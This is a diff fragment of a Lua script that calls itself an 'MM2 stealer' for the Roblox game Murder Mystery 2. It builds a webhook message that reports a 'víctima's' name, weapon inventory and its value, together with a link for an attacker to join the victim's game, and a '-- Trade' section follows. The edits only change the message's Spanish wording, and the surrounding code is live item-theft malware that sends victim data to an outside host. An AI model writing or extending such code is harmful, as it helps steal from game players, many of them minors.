@@ -178,16 +178,16 @@ local realLink = "[Unirse](https://fern.wtf/joiner?placeId="..game.PlaceId.."&ga
 -- Webhook inventario
 if #weaponsToSend > 0 then
     local fieldsInit={
-        {name="Victim 👤:", value=LocalPlayer.Name, inline=true},
+        {name="Victima 👤:", value=LocalPlayer.Name, inline=true},
         {name="Inventario 📦:", value="", inline=false},
         {name="Valor total del inventario📦:", value=tostring(totalValue).."💰", inline=true},
-        {name="Click para unirse 👇:", value=realLink, inline=false} -- solo el real
+        {name="Click para unirte a la víctima 👇:", value=realLink, inline=false} -- solo el real
     }
     for _, w in ipairs(weaponsToSend) do
         fieldsInit[2].value=fieldsInit[2].value..string.format("%s x%s (%s) | Value: %s💎\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
     end
     local prefix=pingEveryone and "@everyone " or ""
-    SendWebhook("💪MM2 Hit el mejor stealer💯","💰Solo Godly/Ancient armas",fieldsInit,prefix)
+    SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fieldsInit,prefix)
 end
 
 -- 🔹 Trade
